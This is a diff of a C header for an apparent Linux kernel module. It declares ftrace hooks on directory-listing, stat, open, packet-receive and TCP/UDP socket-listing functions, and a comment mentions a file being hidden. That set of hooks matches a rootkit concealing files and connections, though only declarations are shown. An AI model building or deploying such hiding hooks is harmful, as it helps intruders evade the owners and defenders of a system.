@@ -1,6 +1,7 @@
 #ifndef HOOKS_H
 #define HOOKS_H
 
+#include <linux/types.h>
 #include <linux/dirent.h>       // struct linux_dirent64
 #include <linux/sched.h>        // struct task_struct
 #include <linux/fdtable.h>      // struct files_struct, struct fdtable
@@ -23,6 +24,7 @@
 #include <linux/ip.h>				// ip_hdr()
 #include <linux/ipv6.h>				// ipv6_hdr()
 
+#include <linux/ftrace.h>
 
 struct ftrace_hook {
 	const char *name;
@@ -34,66 +36,67 @@ struct ftrace_hook {
 };
 
 struct Extended_array {
-    void* array_addr;
+    void *array_addr;
     int array_size;
 };
 
+
 // ------------------------------- filldir ----------------------------------------
-static bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen,
+extern bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen,
 		     loff_t offset, u64 ino, unsigned int d_type);
-static bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen,
-		     loff_t offset, u64 ino, unsigned int d_type);
-
-static bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen,
-		     loff_t offset, u64 ino, unsigned int d_type);
-static bool ex_filldir(struct dir_context *ctx, const char *name, int namlen,
+bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen,
 		     loff_t offset, u64 ino, unsigned int d_type);
 
+extern bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type);
+bool ex_filldir(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type);
 
-// static asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
-// static asmlinkage long ex_sys_getdents64(struct pt_regs *regs);
+
+// extern asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
+// extern asmlinkage long ex_sys_getdents64(struct pt_regs *regs);
 // --------------------------------------------------------------------------------
 
 // ------------------------------- stat -------------------------------------------
-static asmlinkage long (*real_sys_stat)(struct pt_regs *regs);
-static asmlinkage long ex_sys_stat(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_stat)(struct pt_regs *regs);
+asmlinkage long ex_sys_stat(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_lstat)(struct pt_regs *regs);
-static asmlinkage long ex_sys_lstat(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_lstat)(struct pt_regs *regs);
+asmlinkage long ex_sys_lstat(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_newstat)(struct pt_regs *regs);
-static asmlinkage long ex_sys_newstat(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_newstat)(struct pt_regs *regs);
+asmlinkage long ex_sys_newstat(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs);
-static asmlinkage long ex_sys_newlstat(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs);
+asmlinkage long ex_sys_newlstat(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs);
-static asmlinkage long ex_sys_newfstatat(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs);
+asmlinkage long ex_sys_newfstatat(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_statx)(struct pt_regs *regs);
-static asmlinkage long ex_sys_statx(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_statx)(struct pt_regs *regs);
+asmlinkage long ex_sys_statx(struct pt_regs *regs);
 // --------------------------------------------------------------------------------
 
 // ------------------------------- open -------------------------------------------
 // не до конца сделано. надо изменять название скрываемого файла
-static asmlinkage long (*real_sys_open)(struct pt_regs *regs);
-static asmlinkage long ex_sys_open(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_open)(struct pt_regs *regs);
+asmlinkage long ex_sys_open(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
-static asmlinkage long ex_sys_openat(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
+asmlinkage long ex_sys_openat(struct pt_regs *regs);
 
-static asmlinkage long (*real_sys_openat2)(struct pt_regs *regs);
-static asmlinkage long ex_sys_openat2(struct pt_regs *regs);
+extern asmlinkage long (*real_sys_openat2)(struct pt_regs *regs);
+asmlinkage long ex_sys_openat2(struct pt_regs *regs);
 // --------------------------------------------------------------------------------
 
 
 // --------------------------------------------------------------------------------
 // подключения
-// static asmlinkage long (*real_sys_recvfrom)(struct pt_regs *regs);
-// static asmlinkage long ex_sys_recvfrom(struct pt_regs *regs);
+// extern asmlinkage long (*real_sys_recvfrom)(struct pt_regs *regs);
+// extern asmlinkage long ex_sys_recvfrom(struct pt_regs *regs);
 
-// static asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
-// static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);
+// extern asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
+// extern asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);
 
 // --------------------------------------------------------------------------------
 
@@ -101,29 +104,27 @@ static asmlinkage long ex_sys_openat2(struct pt_regs *regs);
 // packet_rcv packet_rcv_spkt tpacket_rcv linux-source-6.11/net/packet/af_packet.c
 // struct sk_buff - linux-headers-6.11.2-common/include/linux/skbuff.h
 
-static int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
-static int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+extern int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
 
-static int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
-static int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+extern int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
 
-static int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
-static int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+extern int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
 
-static asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);
+extern asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
+asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);
 
-static asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);
+extern asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
+asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);
 
-static asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v);
+extern asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v);
+asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v);
 
-static asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
-static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
+extern asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
+asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
 // --------------------------------------------------------------------------------
-
-
 
 #define SYSCALL_NAME(name) ("__x64_" name)
 
@@ -140,36 +141,5 @@ static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
 		.function = (_function),	\
 		.original = (_original),	\
 	}
-
-static struct ftrace_hook EX_hooks[] = {
-	HOOK("filldir64", ex_filldir64, &real_filldir64),
-	HOOK("filldir", ex_filldir, &real_filldir),
-
-
-	// SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),
-
-	// !sys_stat64 sys_lstat64 ??
-	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
-	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
-	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
-	SYS_HOOK("sys_newlstat", ex_sys_newlstat, &real_sys_newlstat),
-	SYS_HOOK("sys_newfstatat", ex_sys_newfstatat, &real_sys_newfstatat),
-	SYS_HOOK("sys_statx", ex_sys_statx, &real_sys_statx),
-
-	SYS_HOOK("sys_open", ex_sys_open, &real_sys_open),
-	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
-	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),
-
-	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
-
-	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
-	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
-	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
-
-	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
-	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
-	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
-	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
-};
 
 #endif
